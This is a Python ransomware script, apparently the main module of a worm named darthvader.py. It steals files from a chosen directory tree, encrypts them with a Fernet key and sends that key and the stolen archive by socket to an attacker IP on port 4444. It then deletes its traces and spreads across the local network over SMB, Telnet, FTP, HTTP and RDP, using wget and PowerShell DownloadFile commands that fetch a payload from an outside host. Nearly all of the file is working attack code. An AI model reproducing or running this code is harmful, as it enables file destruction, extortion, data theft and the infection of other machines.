# Author: SergioZ3R0
#region Imports
from time import sleep
imports = ["subprocess", "sys", "os", "ctypes", "socket", "datetime", "time", "window", "cryptography", "ftplib", "telnetlib", "pywinrm", "pysmb"]
#Install necessary modules
def install(package): # Install the required package
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

for module in imports:
    install(module)
#Import necessary modules
import subprocess
import sys
import os
import ctypes
import socket
from datetime import datetime, timedelta
import time
import window
from cryptography.fernet import Fernet
from ftplib import FTP
import telnetlib
import winrm
from smb.SMBConnection import SMBConnection
import spread
from stealer import stealer
#endregion
#region Definitions
files = [] # List to store the files in the current directory
def recorrer_arbol_directorios(directory):
    global files
    importantF=["darthvader.py", "skywalker.py", "logo.png", "spread.py", "time_remaining.txt", "window.py", "stealer.py", "auto_run", "encryption_time.txt","README.md","auto_run.cpp","steal.zip"]
    try:
        for file in os.listdir(directory):
            rute_element = os.path.join(directory, file)
            if not os.path.islink(rute_element):
                if os.path.isdir(rute_element):
                    # Ignora los directorios relacionados con Python
                    if "python" in rute_element.lower():
                        continue
                    print("Directory:", rute_element)
                    recorrer_arbol_directorios(rute_element)
                else:
                    # Ignora los archivos relacionados con Python
                    if file.endswith('.py') or file.endswith(".deb") or file.endswith(".exe") or file in importantF:
                        continue
                    print("File:", rute_element)
                    files.append(rute_element)
    except Exception as e:
        pass
    print(files)

def send_file_to_host(file_path, host, port): # Send the key file to the attacker
    with open(file_path, 'rb') as file:
        data = file.read()
        print(file)
        print(data)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # Create a socket object
        s.connect((host, port)) # Connect to the attacker's server
        s.sendall(data) # Send the file

def unify_files(file1, file2, unified_file):
    with open(file1, 'r') as f1, open(file2, 'r') as f2, open(unified_file, 'w') as uf:
        uf.write(f1.read())
        uf.write('\n')
        uf.write(f2.read())
#endregion
#region Main

recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))

key = Fernet.generate_key() # Generate a key

with open("key.key", "wb") as key_file: # Open the key file in write binary mode
    key_file.write(key) # Write the key to the file

#region Stealer
stealer(files)
#endregion

# Encrypt the files
for file in files:
    try:
        with open(file, "rb") as f: # Open the file in read binary mode
            data = f.read()
        data_encrypted = Fernet(key).encrypt(data) # Encrypt the file
        with open(file, "wb") as f:
            f.write(data_encrypted) # Write the encrypted data to the file
    except Exception as e:
        print(f"Error encrypting file {file}: {e}")

# Store the encryption time
with open("encryption_time.txt", "w") as f:
    f.write(str(datetime.now()))



# Usage unify_files
unify_files('key.key', 'encryption_time.txt', 'unified_file.txt')

# Usage: send_file
try:
    send_file_to_host('unified_file.txt', '192.168.1.137', 4444)
    sleep(5)
    send_file_to_host("steal.zip", "192.168.1.137", 4444)
except:
    pass


#Delete the randsomware
os.remove("key.key")
os.remove("encryption_time.txt")
os.remove("unified_file.txt")
#region Spread
network_prefix = "192.168.1"
try:
    # Call functions from spread module and execute specific functions
    open_smb_hosts = spread.scan_network_for_smb(network_prefix)
    for host in open_smb_hosts:
        spread.upload_script_to_smb(host, "./auto_run")

    open_telnet_hosts = spread.scan_network_for_telnet(network_prefix)
    for host in open_telnet_hosts:
        spread.execute_command_on_telnet(host, "wget http://example.com/auto_run")

    open_ftp_hosts = spread.scan_network_for_ftp(network_prefix)
    for host in open_ftp_hosts:
        spread.upload_script_to_ftp(host, "./auto_run")

    open_http_hosts = spread.scan_network_for_http(network_prefix)
    for host in open_http_hosts:
        spread.upload_script_to_http(host, "./auto_run")

    open_rdp_hosts = spread.scan_network_for_rdp(network_prefix)
    for host in open_rdp_hosts:
        spread.execute_command_on_rdp(host, "powershell -c (New-Object Net.WebClient).DownloadFile('http://example.com/auto_run', 'auto_run')")

except Exception as e:
    print(f"Error spreading: {e}")
#endregion
window.Window()

os.remove("darthvader.py")
#endregion
